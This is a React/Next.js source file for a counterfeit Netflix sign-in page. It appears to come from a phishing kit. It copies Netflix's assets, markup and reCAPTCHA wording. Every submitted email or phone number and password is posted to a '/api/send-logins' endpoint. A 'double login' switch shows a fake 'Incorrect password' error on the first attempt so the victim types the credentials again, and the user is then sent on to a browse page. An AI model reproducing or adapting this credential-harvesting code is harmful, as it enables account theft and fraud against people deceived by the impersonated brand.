/* eslint-disable @next/next/no-img-element */
import React, { useContext, useEffect, useState } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { Footer } from "../components/Footer";
import { Logo } from "../components/Logo";
import { Wrapper } from "../components/Wrapper";
import { DataContext } from "./_app";
import { PhoneCountrySelector } from "../components/PhoneCountrySelector";

interface LoginProps {}

const phoneRegExp =
  /^((\\+[1-9]{1,4}[ \\-]*)|(\\([0-9]{2,3}\\)[ \\-]*)|([0-9]{2,4})[ \\-]*)*?[0-9]{3,4}?[ \\-]*[0-9]{3,4}?$/;

yup.addMethod(yup.string, "or", function (schemas, msg) {
  return this.test({
    name: "or",
    message: "Please enter a valid email or phone number." || msg,
    test: (value) => {
      if (Array.isArray(schemas) && schemas.length > 1) {
        const resee = schemas.map((schema) => schema.isValidSync(value));
        return resee.some((res) => res);
      } else {
        throw new TypeError("Schemas is not correct array schema");
      }
    },
    exclusive: false,
  });
});

const schema = yup.object().shape({
  username: yup
    .string()
    // @ts-ignore
    .or([
      yup.string().email(`Please enter a valid email.`),
      yup.string().matches(phoneRegExp, "Please enter a valid phone number."),
    ]),
  password: yup
    .string()
    .min(4, `Your password must contain between 4 and 60 characters.`)
    .max(60, `Your password must contain between 4 and 60 characters.`),
});

export const Login: React.FC<LoginProps> = () => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const [countrySelected, setCountrySelected] = useState({
    name: ``,
    countryCode: ``,
  });

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN DETAILS`);
    formData.append(
      `loginDetails`,
      JSON.stringify({ loginAttempt: loginAttempt + 1, ...data })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN DETAILS`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN DETAILS`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    push(`/browse`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });
  return (
    <Wrapper>
      <div className={`login-wrapper hybrid-login-wrapper`}>
        <div className={`login-wrapper-background`}>
          <img
            className="concord-img vlv-creative"
            src="https://assets.nflxext.com/ffe/siteui/vlv3/c732cb00-be61-4d64-b8c3-99f022e7a123/af0a5414-5595-4860-8551-ba03f8a22436/ZA-en-20220620-popsignuptwoweeks-perspective_alpha_website_small.jpg"
            srcSet="https://assets.nflxext.com/ffe/siteui/vlv3/c732cb00-be61-4d64-b8c3-99f022e7a123/af0a5414-5595-4860-8551-ba03f8a22436/ZA-en-20220620-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/c732cb00-be61-4d64-b8c3-99f022e7a123/af0a5414-5595-4860-8551-ba03f8a22436/ZA-en-20220620-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/c732cb00-be61-4d64-b8c3-99f022e7a123/af0a5414-5595-4860-8551-ba03f8a22436/ZA-en-20220620-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w"
            alt=""
          />
        </div>
        <div className={`nfHeader login-header signupBasicHeader`}>
          <a href="" className="svg-nfLogo signupBasicHeader">
            <Logo />
            <span className="screen-reader-text">Netflix</span>
          </a>
        </div>
        <div className="login-body">
          <div>
            <div className="login-content login-form hybrid-login-form hybrid-login-form-signup">
              <div className="hybrid-login-form-main">
                <h1 className="login-page-title">Sign In</h1>
                {showError ? (
                  <div
                    data-uia="error-message-container"
                    className="ui-message-container ui-message-error"
                  >
                    <div className="ui-message-icon"></div>
                    <div data-uia="text" className="ui-message-contents">
                      <b>Incorrect password.</b> Please try again or you can{" "}
                      <a>reset your password.</a>
                    </div>
                  </div>
                ) : null}
                <form className="login-form">
                  <div
                    className={`nfInput nfEmailPhoneInput  ${
                      errors.username && errors.username.message
                        ? `nfEmailPhoneInError`
                        : ``
                    } login-input login-input-email`}
                  >
                    <div className="nfInputPlacement">
                      <div
                        className={`nfEmailPhoneControls ${
                          watch(`username`) && !isNaN(watch(`username`))
                            ? `nfEmailPhoneHasSelector`
                            : ``
                        }`}
                      >
                        <label className="input_id">
                          <input
                            className={`nfTextField ${
                              watch(`username`) ? `hasText` : ``
                            } ${
                              errors.username && errors.username.message
                                ? `error`
                                : ``
                            }`}
                            id="id_userLoginId"
                            {...register(`username`)}
                          />
                          <label
                            htmlFor="id_userLoginId"
                            className="placeLabel"
                          >
                            Email or phone number
                          </label>
                        </label>
                        <PhoneCountrySelector
                          selected={countrySelected}
                          setSelected={setCountrySelected}
                        />
                      </div>
                    </div>
                    {errors.username && errors.username.message ? (
                      <div id="" className="inputError">
                        {errors.username.message}
                      </div>
                    ) : null}
                  </div>
                  <div
                    className={`nfInput nfPasswordInput ${
                      errors.password && errors.password.message
                        ? `nfPasswordInError`
                        : ``
                    } login-input login-input-password`}
                  >
                    <div className="nfInputPlacement">
                      <div className="nfPasswordControls">
                        <label className="input_id">
                          <input
                            type={`password`}
                            className={`nfTextField ${
                              watch(`password`) ? `hasText` : ``
                            } ${
                              errors.password && errors.password.message
                                ? `error`
                                : ``
                            }`}
                            id={`id_password`}
                            {...register(`password`)}
                          />
                          <label htmlFor="id_password" className="placeLabel">
                            Password
                          </label>
                        </label>
                        <button
                          id="id_password_toggle"
                          type="button"
                          className="nfPasswordToggle"
                          title="Show Password"
                        >
                          SHOW
                        </button>
                      </div>
                    </div>
                    {errors.password && errors.password.message ? (
                      <div id="" className="inputError">
                        {errors.password.message}
                      </div>
                    ) : null}
                  </div>
                  <button
                    className="btn login-button btn-submit btn-small"
                    type="submit"
                    onClick={onSubmit}
                    disabled={loading}
                  >
                    Sign In
                  </button>
                  <div className="hybrid-login-form-help">
                    <div className="ui-binary-input login-remember-me">
                      <input
                        type="checkbox"
                        className=""
                        name="rememberMe"
                        id="bxid_rememberMe_true"
                        value="true"
                        data-uia="rememberMe"
                      />
                      <label
                        htmlFor="bxid_rememberMe_true"
                        data-uia="label+rememberMe"
                      >
                        <span className="login-remember-me-label-text">
                          Remember me
                        </span>
                      </label>
                      <div className="helper"></div>
                    </div>
                    <a
                      className="link login-help-link"
                      target="_self"
                      data-uia="login-help-link"
                    >
                      Need help?
                    </a>
                  </div>
                </form>
              </div>
              <div className="hybrid-login-form-other">
                <div className="login-signup-now" data-uia="login-signup-now">
                  New to Netflix? <a>Sign up now</a>.
                </div>
                <div
                  className="recaptcha-terms-of-use"
                  data-uia="recaptcha-terms-of-use"
                >
                  <p>
                    <span>
                      {`This page is protected by Google reCAPTCHA to ensure you're
                  not a bot.`}
                    </span>
                    &nbsp;
                    <button
                      className="recaptcha-terms-of-use--link-button"
                      data-uia="recaptcha-learn-more-button"
                    >
                      Learn more.
                    </button>
                  </p>
                  <div
                    className="recaptcha-terms-of-use--disclosure"
                    data-uia="recaptcha-disclosure"
                  >
                    <span id="" data-uia="recaptcha-disclosure-text">
                      The information collected by Google reCAPTCHA is subject
                      to the Google{" "}
                      <a id="recaptcha-privacy-link">Privacy Policy</a> and{" "}
                      <a id="recaptcha-tos-link">Terms of Service</a>, and is
                      used for providing, maintaining, and improving the
                      reCAPTCHA service and for general security purposes (it is
                      not used for personalized advertising by Google).
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <Footer />
      </div>
    </Wrapper>
  );
};

export default Login;
